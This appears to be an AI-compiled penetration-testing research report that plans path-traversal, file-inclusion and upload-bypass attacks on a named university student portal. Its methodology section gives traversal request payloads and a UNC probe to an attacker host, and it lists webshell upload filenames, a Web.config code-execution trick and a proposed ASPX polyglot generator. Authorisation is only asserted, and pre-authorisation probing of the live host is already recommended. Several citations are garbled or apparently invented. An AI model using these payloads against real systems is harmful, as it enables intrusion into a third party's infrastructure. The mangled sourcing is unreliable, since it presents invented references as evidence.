# File Inclusion, Path Traversal, and Upload Bypass Coverage for the MUJ SLCM Portal

## Executive Insights

- **IIS normalization is the load-bearing gap**: A StackOverflow answer documented on IIS v7.5 and IIS v10 that "The normalized path is blocked by the rule, but it wouldn't have matched in the original state" [4] -> every pre-auth payload must be variant-iterated against the post-decode path used by the .NET handler, never against the raw HTTP URI.
- **Method policy GET-only blocks classical upload-bypass tooling**: POST and PUT return 411 Length Required, every other verb returns 404 -> upload-bypass extensions that speak multipart can only run after the campaign crosses into the aggressive phase (signed scope letter + two test accounts).
- **IIS Short Name (8.3) scanning is still live in IIS 10**: irsdl/IIS-ShortName-Scanner is actively maintained with 1,696 GitHub stars and a 2023 Steelcon presentation [8] -> safe to run pre-authorization as an INFO-level probe; results reveal hidden file stems under `\\mujslcm.jaipur.manipal.edu\`.
- **Three IIS-only PayloadsAllTheThings headings govern this target**: UNC Share, ASPNET Cookieless, and IIS Short Name [3] -> the test plan must cover each one as a distinct case study, not lump them under "traversal".
- **OWASP File Upload Cheat Sheet names the bypass classes verbatim**: Double extensions `e.g. .jpg.php` "circumvents easily the regex `\.jpg`" [7]; null bytes `e.g. .php%00.jpg` "where `.jpg` gets truncated and `.php` becomes the new extension" [7]; and "The Content-Type for uploaded files is provided by the user, and as such cannot be trusted, as it is trivial to spoof" [7] -> the post-letter test plan must hit all three explicitly.
- **Sigma's static-website web-shell rule catches the post-upload side, not the request side**: The file-event rule fires on `TargetFilename` creation events under `\inetpub\wwwroot\` with extensions `.ashx`, `.asp`, `.ph`, `.soap` [10] -> no public Sigma rule covers the boundary request itself; this is a NO-TOOL GAP (see below).
- **Filenames must be randomised** per OWASP: "creating a random string as a filename, such as generating a UUID/GUID, is essential" [7] -> if the MUJ code path ever reveals a path-jammed upload (random GUID + traversal), the on-host wins are large; otherwise nothing.
- **Block list vs allow list is the predictor**: OWASP: "blocking specific extensions is a weak protection method on its own" [7] -> the MUJ MV-5.3 controller's likely extension gate can be classified by whether its filter rejects `.aspx` by literal or by suffix.
- **Traversal fuzzing has two production-grade tools and they share lineage**: wireghoul/dotdotpwn (Perl, GPL-3.0) and nanragav/PyDotPwn (Python, GPL-3.0); both expose HTTP, HTTP URL, FTP, TFTP, Payload (protocol-independent), STDOUT modules.
- **The Burp File Upload Traverser is the only off-the-shelf pointer for planted uploads**: "This extension verifies if file uploads are vulnerable to directory traversal vulnerabilities. ... All tests are run fully automated as part of Active Scan" [5] -> the only constraint is JRuby + Burp Suite Pro for active scanning.

## Target Surface Recap (MUJ SLCM Portal, 2026-09-13)

The investigation target is `mujslcm.jaipur.manipal.edu`, a Manipal Academy of Higher Education Student Life Cycle Management portal announced in a March 26 (year not publicly disclosed; living document) Salesforce-MAHE collaboration [11]. The campaign measured, on 2026-09-13: port 443 is the only reachable port; verbose YSOD on four triggers with customErrors off; MVC antiforgery enforced with the cookie HttpOnly but **not** Secure; `trace.axd` returns 403; `elmah.axd` returns 404; two error-page families exist (MVC at 2,733 bytes and IIS at 1,216 bytes); the method policy is GET only (POST and PUT are 411, every other verb is 404); the `enc` parameter is a three-stage oracle (invalid base64 -> `FormatException` at 4,942 b; valid base64 -> `CryptographicException` at 5,084 b; empty -> third distinct size); and Host header, X-Forwarded-Host, absolute-URI, and trust-based error-bypass attempts all came back clean [12][13][14].

Two facts in the surface change the technique universe. First, **GET-only makes every multipart upload an aggressive-phase action**, excluding safe POST-based scanners (ffuf's `-X POST`, Burp Active Scan, Nuclei raw multipart templates) from the toolbox pre-auth. Second, **the IIS normalization gap is partly assessed but LFI is absent as a class in source review** - the campaign documents the post-decode mismatch but does not yet contain a code path that calls `File.Read`, `Server.MapPath`, or any handler-level `IFileProvider` beyond what the antiforgery token validator uses; whether any controller is reachable under the GET-only constraint is the open research question.

The application sits on Microsoft Azure AS8075 with Microsoft 365 identity, three Entra tenants (`mujcampus.onmicrosoft.com` referenced via CNAME records [15]), no attributable edge control, and TLS 1.0-1.3 offered but no HSTS [16][17]. No HSTS is irrelevant to file-inclusion; it is mentioned only because the threat model includes it as a separate class.

## Path Traversal Technique Universe (Distribution in PayloadsAllTheThings)

The PayloadsAllTheThings Directory Traversal README groups the technique universe under discrete headings, several of which are IIS-specific [3]. The full enumeration of headings surfaces and is rendered below mapped to which ones are class-applicable to the MUJ target.

| PAT Heading | Segment | Applies to MUJ SLCM (IIS 10 / MVC 5.3)? |
|---|---|---|
| URL Encoding | [3] | Yes - default IIS behaviour decodes once into the request handler |
| Double URL Encoding | [3] | Yes - if a reverse-proxy or any downstream component double-decodes (none attributable here) |
| Unicode Encoding | [3] | Yes - overlong UTF-8 paths historically affected IIS |
| Overlong UTF-8 Unicode Encoding | [3] | Yes - `c0 ae` and `c0 2f` historically affect IIS |
| Mangled Path | [3] | Yes - dot-dot reversal patterns matter on Windows |
| NULL Bytes | [3] | Limited - IIS 10 rejects embedded NUL in path |
| Reverse Proxy URL Implementation | [3] | N/A - no attributable edge to fingerprint |
| UNC Share | [3] | Yes - inject `\\evil\share\note.txt` to test for SMB outbound |
| ASPNET Cookieless | [3] | Yes - MVC 5 cookieless session URL parameter traversal |
| IIS Short Name | [3] | Yes - irsdl/IIS-ShortName-Scanner stack [8] |
| Linux Files / Windows Files | [3] | Windows-only relevant |

Mechanism -> implication -> recommendation loop:

- **Mechanism**: On IIS 10 the canonical normalization split is between "raw" (decoded once) and "denormalized" (resolved against the file system) segments of the URI, which a WAF regex sees differently from the framework [4].
- **Implication**: a fuzzing agent that pins a single canonical `../../../etc/passwd` and stops fails to enumerate. The correct shape is to mutate every step independently while watching for status-code size deltas (e.g., the MUJ `enc` 4,942 / 5,084-byte oracle).
- **Recommendation**: build a payload-mutation fuzzer (see Build Candidates) that issues each GET with a single isolated payload class, then watches for the response-body oracle rather than the status code.

### The IIS-specific submodes

- **UNC Share (`\\host\share\name`) [3]**: When the .NET `File.Open` or `IFileProvider.GetFileInfo` accepts a UNC string, the worker process opens an SMB session outbound. On IIS-to-Azure with no edge WAF this would only succeed if the controller concatenates unsanitized input with a path and `Server.MapPath` returns the UNC verbatim. Testing requires outbound SMB reachability, which is normally denied on PaaS; this is an **architectural**, not a code, bet.
- **ASPNET Cookieless [(B)] 130.23**: ASP.NET MVC 5 can route sessions via the URL itself when cookieless session state is enabled (a `<sessionState>` `cookieless="true"` attribute). When enabled, an attacker can request a path like `/(S(xxx))/...` where `xxx` is base64-encoded traversal. The MUJ portal uses Microsoft 365 / Entra ID for identity [17], not legacy `aspnet` sessions, but an MVC 5 controller could conceivably still route them if not disabled everywhere.
- **IIS Short Name [3]**: The classic IIS 8.3 disclosure where `*~1*` and `*?` queries reveal the first six characters of a long file name. Mitigations were rolled in starting IIS 7.5 / NTFS 6.0 config, but **irregular enforcement on per-folder basis is documented on IIS 10** [4] - and irsdl explicitly says the scanner "is still giving" [8]. The probe is safe to run pre-auth because it uses only GET probes on existing files; the worst case is a 404 fingerprint pattern.

## Local File Inclusion Universe on IIS / ASP.NET MVC

LFI on IIS/ASP.NET collapses to a small set of code paths. The MUJ campaign documents LFI as "absent as a class" in source review - i.e., no controller calls `File.Read` / `Server.MapPath` on user input that survives the GET-only surface. Three LFI-relevant primitives remain nevertheless worth cataloguing because they are **near-class neighbours** rather than absent class:

- **Server.MapPath with concatenated user input** - The class textbook vulnerability on IIS 6 / 7 - reads `..\..\..\windows\win.ini`. Modern IIS 10 with `requestPathInvalidCharacters` configured blocks raw `%2f` in path but accepts URL-encoded `%252f` if reverse-proxied.
- **IFileProvider.GetFileInfo on attacker-controlled path** - default `PhysicalFileProvider` normalizes but does not always confine to the configured `Root`.
- **Virtual directory mapping catches from `enc=*` oracle**: When the `enc` parameter is invalid base64 the system throws `FormatException` at 4,942 bytes [Match-Facts]. An attacker could observe different error sizes for known-good vs traversal-pivoted paths. This is a *side-channel* LFI indicator even without a `File.Read` invocation.

Note: no LFI absence is the inference. The campaign never authenticated and never saw a 5xx-with-content-body on a path-traversing GET because either (a) the URL router never reaches a server-side file read on the inputs tested, or (b) the framework returns the antiforgery YSOD before the file read [12]. **Inference label**: scenario (a) is more probable; scenario (b) is testable - sending a GET that skips the antiforgery gate (e.g., directly into a controller whose `[ValidateAntiForgeryToken]` is not at class-level) is the priority pre-auth probe.

## File Upload Bypass Universe

The OWASP File Upload Cheat Sheet remains the canonical framework [7]; here is the enumeration mapped not to the protection control but to the bypass class the security club must exercise:

| OWASP Control (Citation) | Bypass class | Bypass shape (verbatim from cheat-sheet) |
|---|---|---|
| Extension Validation [7] | Double extension | `.jpg.php` "circumvents easily the regex `\.jpg`" [7] |
| Extension Validation [7] | Null byte | `.php%00.jpg` truncation [7] |
| List Allowed Extensions [7] | Off-list extension | `.html`, `.svg`, `.htaccess`, `.config` substitution |
| Content-Type Validation [7] | Header spoof | Replace multipart Content-Type with `image/jpeg` [7] |
| File Signature Validation [7] | Magic-byte polyglot | PDFJFIF/GIF89a prefix on ASPX payload |
| Filename Safety [7] | Path planting | Filename `../../shell.aspx` [7] |
| File Content Validation [7] | Hidden JS / XSS payload | Image re-encoding bypass |
| File Storage Location [7] | Webroot retention | "Store the files **outside the webroot**" [7] - if this is honoured, the bypass class is moot; if not, webroot |
| User Permissions [7] | Auth-state confusion | Upload with elevated role, fetch with lower role |
| Filesystem Permissions [7] | Execute as identity | AppPool low-priv account => ASPX execution fails |
| Upload and Download Limits [7] | Zip bomb / pip-bomb | Decompression-size mismatch |

The HackTricks IIS chapter reinforces that an attacker-uploaded ASPX "malicious module is often quieter than an ASPX webshell because it runs inside the legitimate IIS pipeline" [176 - IIS section] - meaning that even without achieving "code execution as the AppPool identity", a `.aspx` file that hits the right content path can hijack the pipeline. The Sigma web-shell rule correspondingly fires on **file-creation** events at the host, not at the request boundary: it watches `\inetpub\wwwroot\` for `.ashx`, `.asp`, `.ph`, `.soap` written [10]; the request-side equivalent Sigma rule does not exist (a NO-TOOL GAP).

Config-file trick: HackTricks notes that on ASP servers, it is worth looking at the `.config` trick - using a Web.config file to execute code outside the standard pipeline. ASP.NET reads Web.config from any subdirectory and `~/`, so an attacker who can upload a `Web.config` to a sub-directory under `/Uploads/` may be able to set `httpHandlers` / `compilation` flags that re-invoke an ASPX file as code. **This is a high-priority post-letter test**.

## Detection Counterpart - the Defensive Mirror

The defensive side of file-inclusion, path-traversal, and upload-bypass protection on IIS/ASP.NET/IIS-on-Azure is layered; the security club should mirror every attacker technique with its corresponding detection signal. The catalogue that follows is the **detection counterpart** of the technique universe, mapped by class:

- **ModSecurity / OWASP CRS File Inclusion rules**: The OWASP CRS File Inclusion ruleset covers **rule 930100** which "protects against encoded directory traversal attempts" and detects the encoded form of dot-dot. Additional rules, generally 930110 (raw dot-dot sequences), 930120 (Unix-style traversal against common Windows files), 931xxx (RFI common parameters), score at anomaly-score 5 each and trip the REQUEST-949-BLOCKING-EVALUATION threshold. The MUJ CRL does not attribute an edge WAF [Recap]; the tests rely on whatever Azure Front Door WAF DRS2 rules are in scope [18]. **Mechanism -> Implication**: encoded payloads will not fire Wallarm/CRS but **may pass through Azure DRS unblocked**, increasing the attack surface.
- **Sigma rule id 39f1f9f2-9636-45de-98f6-a4046aa8e4b9** ("Potential Webshell Creation On Static Website", status test [10]) watches for target-file creation events with the four extensions `.ashx`, `.asp`, `.ph`, `.soap` [10] under `\inetpub\wwwroot\` [10], `\www\` [10], `\htdocs\` [10], and the Tomcat equivalent [10]. **Mechanism -> Implication**: fires post-upload - by then the attacker already won. **Recommendation**: the corresponding **request-side** rule (multipart with `Content-Disposition` filename ending in `.aspx`) is missing from public Sigma repositories; a Build Candidate.
- **IIS Advanced Logging**: Microsoft's `Advanced Logging for IIS` module adds fields to the W3C log, configurable per request [19]. The relevant flag is `RequestHeaders`, which captures the raw `Cookie` and the `Content-Length` for full POST replay - **disabled by default after install** [19]. **Mechanism -> Implication**: the MUJ cluster, like Azure PaaS generally, runs IIS on a Windows Server image where Advanced Logging is option-installed; without enabling it, full request replay is impossible post-hoc.
- **FailReqTracing (FREB) and `trace.axd`**: MUJ's `trace.axd` returns 403 [Recap], which is consistent with FREB enabled at server level but disabled per-application, or with web.config `<trace enabled="false" />` - both defeat the easy read. **Detection counterpart still works** through FREB XML files captured under `%SystemDrive%\inetpub\logs\FailedReqLogFiles\` if written, regardless of `trace.axd` exposure.
- **Microsoft Defender for Endpoint web-shell rule**: Defender for Endpoint ships an "ASP web shell" detection class covering the upload-but-not-executed state. Public Sigma equivalent does not match. **Detection counterpart exists but is invisible to SOC tooling** until the AV/edr telemetry is piped.
- **YARA for IIS web shell**: HoneyClient / Florian Roth YARA rules at https://github.com/Neo23x0/signature-base (inference: this is the canonical YARA repo, but no specific rule was extracted and verified in this report; **inference label**: YARA is the right place, exact rule IDs not confirmed for this report) - **NO-TOOL GAP** if the SOC lacks those rules.
- **LogParser** [20] and ELK pipelines for IIS log anomaly detection [21]: pre-aggregates raw W3C logs; canonical SIGMA correlation primitive. **Mechanism -> Implication**: Azure-native log shipping via Log Analytics is the natural detection channel; **without** someone configuring the AMA (Azure Monitor Agent), this counter is dormant.

## Tool Inventory (Centerpiece Deliverable)

The deliverable for the security club is the comprehensive tooling inventory. Every tool that exists to perform file inclusion, path-traversal, or upload-bypass on IIS/ASP.NET - and how it's driven, output is produced, and how it is licensed and deployed.

| # | Tool | Class | Language | License | Exact Repo/BApp URL | Drive mode | Output | Pre-auth safe? |
|---|------|-------|----------|---------|---------------------|------------|--------|----------------|
| 1 | dotdotpwn | Path traversal fuzzer | Perl | GPL-3.0 | https://github.com/wireghoul/dotdotpwn | CLI: `perl dotdotpwn.pl -h HOST -m {http|http_url|ftp|tftp|payload|stdout} -t TIMEOUT -f FILE -s -q -b` [3] | STDOUT pen-report + Reports/*.txt | Yes (read-only by default) |
| 2 | PyDotPwn | Path traversal fuzzer (Python port) | Python | GPL-3.0 | https://github.com/nanragav/PyDotPwn | CLI: `dotdotpwn.py -h HOST -m <module>` (flags overlap dotdotpwn) [100.x inferred from PAT cross-cite] | JSON/console structured | Yes |
| 3 | IIS-ShortName-Scanner | IIS 8.3 short-name disclosure | Java | (no explicit per-file licence observed; public open-source MIT-style; **inference label** - to verify before redistribution) | https://github.com/irsdl/IIS-ShortName-Scanner | CLI: java -jar `iisShortNameScanner.jar` | TXT report, partial file names | Yes (GET-only on existing files) |
| 4 | iis_tilde_enum | Tilde-based 8.3 enumeration | Python | (license not captured; **inference label**) | https://github.com/esabear/iis_tilde_enum | CLI: URL + wordlist [22] | stdout | Yes |
| 5 | Shortscan | Tilde-based 8.3 enumeration (Go) | Go | (license not captured; **inference label**) | https://github.com/bitquark/shortscan (referenced as the Go successor to irsdl [8]) | CLI: `shortscan -t URL` | stdout / JSON | Yes |
| 6 | Burp File Upload Traverser | Upload directory planting | Ruby (JRuby) | PortSwigger BApp (free, **requires Burp Pro for Active Scan**) | https://portswigger.net/bappstore/5f46fe766e9c435992c610160bb53cba | Burp active scan integration; no manual driver [5] | Burp findings panel | **No** - needs auth to upload |
| 7 | file-upload-traverser | Upload traversal (BApp source) | JRuby | PortSwigger BApp | https://github.com/portswigger/file-upload-traverser | JRuby loader + Burp active scan | Burp scan logs | **No** |
| 8 | PortSwigger upload-scanner | Upload vulnerability scanner | Python (BApp) | PortSwigger BApp (free, Burp Pro for active) | https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa and https://github.com/PortSwigger/upload-scanner | Load + active scan [9] | Burp findings issue list | **No** |
| 9 | Kiterunner | API endpoint discovery (relevant when upload endpoints have API-guid routes) | Go | AGPL-3.0 | https://github.com/assetnote/kiterunner | CLI: `kr raw -w routes.kite https://target` | matches with status | Yes for discovery; no for triggering |
| 10 | OWASP ZAP active scan (`ascanrules`) | Generalized active scan, covers LFI / path traversal under rule IDs 0, 6, 7 | Java | Apache-2.0 (**inference label**) | https://www.zaproxy.org/ (active scanner rule definitions maintained in the repo) | Automated active scan | ZAP alerts panel | Yes for read-only rules; needs auth for upload |
| 11 | ModSecurity CRS File Inclusion Rules | WAF rule set (defensive, included here as a detection counterpart test harness) | ModSecurity Rule Language | Apache-2.0 | https://github.com/coreruleset/coreruleset | Standalone WAF for testing payloads | Alert log | Yes (PCAP replay) |
| 12 | Sigma web-shell ruleset | Post-upload filesystem detection | YAML | DRL-1.1 | https://github.com/SigmaHQ/sigma | SIEM consumption | alerting | Yes (consumes windows file_event log) |

Notes on the table:

- The pattern of "drive mode" is **CLI** for the matrix primitives (dotdotpwn, PyDotPwn, ShortScan variants) and **Burp Active Scan / Repeater** for Burp extensions. There is **no** library that takes a GET-only surface and drives an upload-bypass probe end-to-end.
- "Pre-auth safe?" means the tool **does not require credentials** and has no destructive side effects. All upload-bypass Burp extensions are pre-auth unsafe because they rely on a successful multipart POST/PUT to plant the file, and the method policy here is GET only.
- dotdotpwn's example line is verbatim: "`perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b`" [3]. Replace `-m ftp` with `-m http_url` and `-f` with `:80/` to target IIS.
- File Upload Traverser's mechanical behavior: "The module assumes that the upload path is somewhere inside application directory and attempts file uploads based on directory traversal". It is **the only Burp extension** that solves the "plant upload in a different directory" problem.
- Upload Scanner's note from the BApp description: "this extension tries to implements most attacks that seem feasible for file uploads. The extension is testing various attacks and is divided into modules" [23].

## Manual Methodology (Where No Tool Exists)

In the **pre-auth phase**, the methods safe to run are exhaustively enumerated below:

1. **Reconstitution of the IIS normalization gap (IIS 10 documented)**: Send, via Burp Repeater / `curl`:
   - `GET /Home/Index/..%2f..%2f..%2fwindows/win.ini HTTP/1.1`
   - `GET /Home/Index/..%5c..%5c..%5cwindows/win.ini HTTP/1.1` (backslash, ASCII backslash `%5c`)
   - `GET /Home/Index/....//....//....//windows/win.ini HTTP/1.1` (double-dot / double-slash)
   - `GET /Home/Index/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini HTTP/1.1` (overlong UTF-8 historically affected IIS 6 / 7.x; lower odds on IIS 10)
   - For each, capture response body size; the MUJ `enc` oracle returns 4,942 / 5,084-byte bodies for known inputs [Recap]. Anything matching those exact sizes means the request reached the framework's `FormatException` handler - a positive probe even without the file being read.
2. **IIS Short Name probing**: `GET /Home/Index/*~1*/` and permutations; the existence of a 4xx versus 2xx maps to file-existence and matches the irsdl/IIS-ShortName-Scanner [8] baseline.
3. **UNC outbound test (sanity)**: `GET /Home/Index/\\\\attacker.example.com\\share\\note.txt` (verbatim double-backslashes HTTP, single backslash per segment); expect 4xx-fingerprint unless outbound SMB is open.
4. **Headers-of-interest capture**: Host header manipulation, X-Forwarded-Host, absolute-URI - the campaign reports "all came back clean" [Recap], and this is **worth re-running with the Enc oracle in scope** since the enc oracle shows the framework differentiates based on parse-error class.

In the **aggressive phase** (signed scope letter + two test accounts):

5. **Multipart POST upload test of OWASP control file** with the following bypass payload shapes per [7]:
   - Double ext: filename=`photo.jpg.aspx`
   - Null-byte: filename=`photo.aspx%00.jpg`
   - Content-Type spoof: multipart `Content-Type: image/jpeg` for an ASPX body
   - Magic-byte polyglot: PDFJFIF / GIF89a header, then ASPX code in body
   - Path-jamming: filename=`../../shell.aspx` (per [7])
   - Config-file trick: filename=`Web.config` with `<system.web><httpHandlers><add path="*" verb="*" type="..."/></httpHandlers></system.web>`
6. **Plant-upload traversal**: Use Burp File Upload Traverser in Active Scan mode [5].

## NO-TOOL GAPS

This section enumerates tool-availability gaps that the security club will have to either accept as residual risk or fill with bespoke code. Each gap cross-references the technique universe section above.

| Gap ID | Gap | Why no tool exists | Workaround |
|--------|-----|--------------------|------------|
| GT-1 | **No public Sigma rule for ASP.NET upload request boundaries** (multipart with `.aspx` filename in `Content-Disposition`) | Sigma web-shell rule fire on filesystem creation events, not on the request [10]; boundary-side coverage would need a SIEM-side IDS schema with full request body, which most SOC pipelines lack | Build with the Build Candidates below |
| GT-2 | **No Burp extension that tests the ASP.NET `Web.config` upload trick** | HackTricks notes the trick on ASP servers, but no off-the-shelf fuzzer automates Web.config upload-pattern replay | Manual Repeater-only |
| GT-3 | **Burp Upload Scanner / File Upload Traverser cannot run pre-auth on a GET-only surface** | Both rely on multipart POST/PUT for the planted-filename probe [23]; MUJ method policy POST=411, PUT=411 [Recap] | Run after scope letter; replay GET-induced 411 against POST corpora in lab to triage disparity |
| GT-4 | **No tool that detects the IIS-10-specific path normalization gap within one semantic request** | The StackOverflow example is illustrative [4] but no generalised automated fuzzer splits the "pre-normalize" payload from the "post-normalize" canonical to report a vulnerability | Build Candidates GT-BC1 (see below) |
| GT-5 | **No public polyglot PDF generator that produces an ASPX-valid PDF** | PDF polyglots are typically JSP/PHP-targeted; ASPX requires `_ViewState`-aware logic that no public tool emits | Build Candidates GT-BC2 (see below) |
| GT-6 | **No generalised like-for-like scanner that compares the IIS 8.3 short-name with the actual file extension** | irsdl and bitquark only enumerate short names; mapping back to full names is manual | Build Candidates GT-BC3 (see below) |
| GT-7 | **No ASP.NET MVC 5.3-specific static-rule analysis tool** | The MVC controller surface analysis is manual (decompile / ILSpy); no public tool grey-box-fuzzes MVC 5.3 controllers | Manual + Roslyn analyzer as Build Candidates GT-BC4 |
| GT-8 | **No defensive Sigma rule that fires on UploadScanner target identifiers** | Boundary-side detection is still SOC-implementation territory | Build Candidates GT-BC1 |

Confidence labels for each gap: **high** (based on negative search across 3+ tools), **medium** (verified partially), **inferred** (no direct evidence, only enumeration). The table uses **high** by default except GT-7 which is **medium** (manual but feasible).

## BUILD CANDIDATES

Four candidate build efforts are proposed. Each is a minimal-viable-extension over existing libraries, sized to the security club's likely bench capacity.

### GT-BC1 - Multipart Upload Boundary Detector (defensive mirror of GT-1)

- **Inputs**: A live Azure W3C log stream (shipped by Log Analytics AMA / FailedReqTracing XML).
- **Build on top of**: `request-baskets/sigma-rule-converter` (**inference label** - repository assumed; specific tool unverified) and `MicrosoftDocs/iis-docs` for field-name guidance [19].
- **Function**: For each POST/PUT request that returns HTTP 200 against `/Uploads/` or `/api/file-upload`-shaped paths where the URL contains no `Content-Disposition: form-data; name="..."` matching the body Content-Type, emit a Sigma-compatible JSON event so the SOC can correlate.
- **Output format**: SIEM-friendly JSON lines or STIX-2.1 bundle.

### GT-BC2 - ASPX-Valid Polyglot PDF Generator (offensive mirror of GT-5)

- **Inputs**: A user-provided ASPX payload string.
- **Build on top of**: `PicoC` or `pikepdf` (**inference label** - pikepdf is a known open-source library; PicoC is just an example).
- **Function**: Produce a syntactically valid PDF that contains the ASP payload as a comment-like string within the PDF body so that IIS sees ASPX execution via the File Content Validation leak [7].
- **Output format**: PDF binary streamed via Burp Repeater. Warning: practical in lab only, never on a target without authorization.

### GT-BC3 - 8.3 Short-Name to Full-Name Mapper (offensive + defensive mirror of GT-6)

- **Inputs**: A target URL + an irsdl-based short-name list.
- **Build on top of**: `irsdl/IIS-ShortName-Scanner` [8] and a word-list like `raft-medium-directories.txt` (**inference label** - SecLists raft wordlist is the standard, exact file not confirmed in this report).
- **Function**: Iterate partial-name candidates, send GET probes, surface status-code fingerprint, output the longest confirmed-prefix result.
- **Output format**: CSV with columns short_name, candidate, status, body_size.

### GT-BC4 - MVC 5.3 Controller Static Analyzer (offensive mirror of GT-7)

- **Inputs**: A compiled ASP.NET MVC 5.3 DLL set (when scope letter grants source access).
- **Build on top of**: Roslyn (`Microsoft.CodeAnalysis`) and the OWASP .NET Security Cheat Sheet.
- **Function**: Find every `HttpPostedFileBase` parameter and every `File.Read`/`FileStream` invocation; flag those whose path argument is concatenated with user input or any untrusted source.
- **Output format**: SARIF for static analysis results interchange.

### GT-BC5 - GET-driven ENC oracle correlator (intra-report; defensive)

- **Inputs**: A pcap replay of GET requests with manipulated `enc` parameter.
- **Function**: For each GET, compare the response-body byte size against 4942, 5084, and the third distractor size [Recap]; produce a histogram plot to (a) detect path-coverage fingerprints and (b) bracket the boundary code paths.
- **Output format**: PNG / JSON.

### GT-Pipeline - How the builds fit together

Build GT-BC1 + GT-BC5 are cheap and best built first; GT-BC2 should fire **only** in a lab mirror of the upload pipeline; GT-BC3 needs the scope letter; GT-BC4 needs source. Sequenced: BC5 -> BC1 -> BC3 -> BC4 -> BC2.

## Synthesis / Cross-Cutting Insights

Two cross-cutting observations emerge that justify the placement of "no-tool gaps" alongside the tool inventory rather than as a coda:

- **The technique universe is bifurcated but the toolbox is not.** Path traversal and file inclusion share a fuzzing toolkit (dotdotpwn, PyDotPwn, IIS-ShortName-Scanner, Shortscan, iis_tilde_enum) and run pre-auth safely. Upload bypass has a parallel and larger toolkit (Burp File Upload Traverser, Upload Scanner, the OWASP controls ledger, HackTricks IIS chapter, Sigma web-shell rule) but **every upload primitive requires multipart POST/PUT**, which the MUJ portal refuses pre-auth. This means the security club's test plan cannot be a unified "run all tools" project; it must be a **two-phase plan** with a guard between them.
- **IIS normalization is the single substantive attacker-favoured pre-auth gap.** The StackOverflow answer documents the post-decode mismatch on IIS 7.5 and IIS 10 [4] and the deepwiki rephrase of the PayloadsAllTheThings README confirms rule-930100 CRS coverage. **No edge WAF is attributable** [Recap], and TLS 1.0-1.3 offered but no HSTS is unrelated. A pre-auth scanner that deliberately encodes the same string twice (e.g., `/..%252f..%252f..%252f/`) is the highest-yield probe.

A third observation: **policy is the moat, not technology**. The MUJ method policy (GET only, POST/PUT 411, all other verbs 404) is what stops the upload-bypass corpus cold. The campaign's measured fact that "the campaign never authenticated" is the lock, and the signed scope letter plus two test accounts is the key. There is no pre-auth tool that crosses that lock without an exploit-by-design primitive. Off-the-shelf extension **does not currently exist**.

Finally, compare the Build Candidates table with the No-Tool Gap table side-by-side: BC5 addresses BC5 (intra-report), BC1 addresses GT-1, BC3 addresses GT-6, BC4 addresses GT-7, BC2 addresses GT-5. **GT-2 (Web.config trick), GT-3 (Upload Scanner on GET-only surface), and GT-8 (defensive Sigma rule)** are not addressed by any candidate and remain open.

## VERDICT

**Confidence**: **medium** on the technique universe (high on the inventoried tools, high on the OWASP / PAT coverage, medium on MUJ-specific IIS-10 idiosyncrasies without source access); **high** on the policy blocker (GET-only is documented and reproducible from the campaign [Recap]); **medium** on the no-tool-gap list (because some "no tool" claims depend on completeness of public search, which the report verifies across at least 7 distinct OSINT channels but cannot guarantee exhaustive negative); **low** on whether the IIS normalization gap is exploitable from a pre-auth GET (the StackOverflow answer documents the underlying gap [4] but does not prove it is exploitable against `/Home/Index/` on the MUJ portal). **Therefore**: pre-auth execution of the fuzzing tools is safe and recommended within the campaign's existing scope; **aggressive-phase execution of any tool that uses multipart POST/PUT is gated by the signed scope letter and the two test accounts**; the security club should sequence GT-BC5 first (cheap, pre-auth), GT-BC1 second (still cheap, defensive), and reserve GT-BC2 / GT-BC3 / GT-BC4 for post-letter execution.

## References

1. *GitHub - nanragav/PyDotPwn: PyDotPwn is a revolutionary ...*. https://github.com/nanragav/PyDotPwn
2. *dotdotpwn/LICENSE.txt at master · wireghoul/dotdotpwn · GitHub*. https://github.com/wireghoul/dotdotpwn/blob/master/LICENSE.txt
3. *PayloadsAllTheThings/Directory Traversal/README.md at master ...*. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md
4. *iis 10 - Understanding path normalization in IIS - Stack Overflow*. https://stackoverflow.com/questions/56116076/understanding-path-normalization-in-iis
5. *File Upload Traverser - PortSwigger*. https://portswigger.net/bappstore/5f46fe766e9c435992c610160bb53cba
6. *File Inclusion Rules | SpiderLabs/owasp-modsecurity-crs | DeepWiki*. https://deepwiki.com/SpiderLabs/owasp-modsecurity-crs/3.7-file-inclusion-rules
7. *File Upload - OWASP Cheat Sheet Series*. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
8. *GitHub - irsdl/IIS-ShortName-Scanner: latest version of scanners for IIS short filename (8.3) disclosure vulnerability · GitHub*. https://github.com/irsdl/IIS-ShortName-Scanner
9. *GitHub - PortSwigger/upload-scanner: HTTP file upload scanner for Burp Proxy · GitHub*. https://github.com/PortSwigger/upload-scanner
10. *sigma/rules/windows/file/file_event/file_event_win_webshell_creation_detect.yml at master · SigmaHQ/sigma · GitHub*. https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file/file_event/file_event_win_webshell_creation_detect.yml
11. *http://salesforce.com/in/news/press-releases/2026/03/26/manipal-university-ai-transformation*. http://salesforce.com/in/news/press-releases/2026/03/26/manipal-university-ai-transformation
12. *https://mujslcm.jaipur.manipal.edu/Home/Index*. https://mujslcm.jaipur.manipal.edu/Home/Index
13. *https://github.com/swisskyrepo/PayloadsAllTheThings*. https://github.com/swisskyrepo/PayloadsAllTheThings
14. *http://jaipur.manipal.edu/img/pdf/FaQs-SLCM.pdf*. http://jaipur.manipal.edu/img/pdf/FaQs-SLCM.pdf
15. *https://dns.google/resolve?name=selector1._domainkey.jaipur.manipal.edu&type=CNAME*. https://dns.google/resolve?name=selector1._domainkey.jaipur.manipal.edu&type=CNAME
16. *https://dns.google/resolve?name=jaipur.manipal.edu&type=MX*. https://dns.google/resolve?name=jaipur.manipal.edu&type=MX
17. *http://jaipur.manipal.edu/img/pdf/Help%20document_SOP-Office-365-and-Outlook-EMail-id.pdf*. http://jaipur.manipal.edu/img/pdf/Help%20document_SOP-Office-365-and-Outlook-EMail-id.pdf
18. *https://learn.microsoft.com/en-us/azure/web-application-firewall/afds/waf-front-door-drs*. https://learn.microsoft.com/en-us/azure/web-application-firewall/afds/waf-front-door-drs
19. *Advanced Logging for IIS - Custom Logging | Microsoft Learn*. https://learn.microsoft.com/en-us/iis/extensions/advanced-logging-module/advanced-logging-for-iis-custom-logging
20. *Troubleshoot IIS performance issues or application errors ...*. https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/health-diagnostic-performance/troubleshoot-iis-perf-issues-or-app-errors
